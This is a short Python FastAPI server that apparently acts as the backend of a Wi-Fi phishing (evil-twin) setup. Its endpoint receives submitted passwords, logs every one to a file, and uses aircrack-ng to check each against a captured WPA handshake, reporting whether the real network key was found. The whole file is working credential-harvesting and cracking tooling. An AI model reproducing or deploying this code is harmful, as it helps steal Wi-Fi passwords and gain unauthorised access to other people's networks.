from fastapi import FastAPI
from subprocess import Popen,call,PIPE
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()
origins =['*']

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


@app.get("/")
def read_root(passwd:str):
    with open("allrecievedPasswd.txt",'a') as d:
        d.write(passwd)
    with open("lastrecievedPasswd.txt",'w') as f:
        f.write(passwd)

    crack = 'echo "" | aircrack-ng -a 2 -w lastrecievedPasswd.txt capfile.cap'
    air = Popen(crack,stdout=PIPE,shell=True)
    air.wait()
    txt = str(air.communicate()[0])
    result = txt.find("KEY FOUND") != -1
    if(result):
        print("Correct Password : "+ passwd)
        return {"result": True}
    else:
        print("Incorrect Password : "+ passwd)
        return {"result": False}
